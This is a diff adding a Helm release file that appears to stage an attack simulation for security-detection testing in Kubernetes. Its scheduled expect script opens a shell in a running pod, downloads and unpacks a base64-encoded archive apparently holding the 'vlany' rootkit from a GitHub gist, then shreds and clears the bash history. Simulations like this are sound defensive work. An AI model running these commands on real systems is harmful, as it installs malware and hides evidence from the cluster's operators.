@@ -1,0 +1,49 @@
+releases:
+  - name: store-frontend
+    namespace: terminal-shell-in-container
+    chart: ../charts/store-frontend
+    atomic: true
+    values:
+    - php:
+        apache_port: 8080
+
+  - name: terminal-shell-in-container-create-user
+    namespace: terminal-shell-in-container
+    chart: ../charts/create-user
+    atomic: true
+    values:
+      - username: marydoe
+
+  - name: terminal-shell-in-container-trigger
+    namespace: terminal-shell-in-container
+    chart: ../charts/kubectl-trigger
+    atomic: true
+    needs: ["terminal-shell-in-container/terminal-shell-in-container-create-user"]
+    values:
+      - kubeconfigMountPath: /kubeconfig
+      - kubeconfigSecretName: "marydoe-kubeconfig"
+      - schedule: "18 12 * * *"
+      - image:
+          repository: sysdiglabs/kubectl-expect
+          tag: latest
+        interpreter: /usr/bin/expect
+        script: |
+          #!/usr/bin/expect -f
+          set timeout 5
+          set prompt "$ "
+          spawn sh -c "kubectl exec -it `kubectl get pods -n terminal-shell-in-container --field-selector=status.phase=Running -l app.kubernetes.io/name=ping-php -o name | head -n 1` -n terminal-shell-in-container -- bash"
+          send "ls\r"
+          sleep 0.2
+          expect $prompt
+          send "curl https://gist.githubusercontent.com/mateobur/d888e36de12f8fe42a18f54ce4b1fc7c/raw/dd0c4cb23db7cc17a2086c5dee9338522fb8ae69/vlany | base64 -d > vlany-master.tar.gz\r"
+          expect $prompt
+          send "rm -rf vlany-master/\r"
+          expect $prompt
+          send "tar xvfz vlany-master.tar.gz\r"
+          expect $prompt
+          send "shred -f ~/.bash_history\r"
+          expect $prompt
+          send "history -c\r"
+          expect $prompt
+          send "exit\r"
+          expect eof
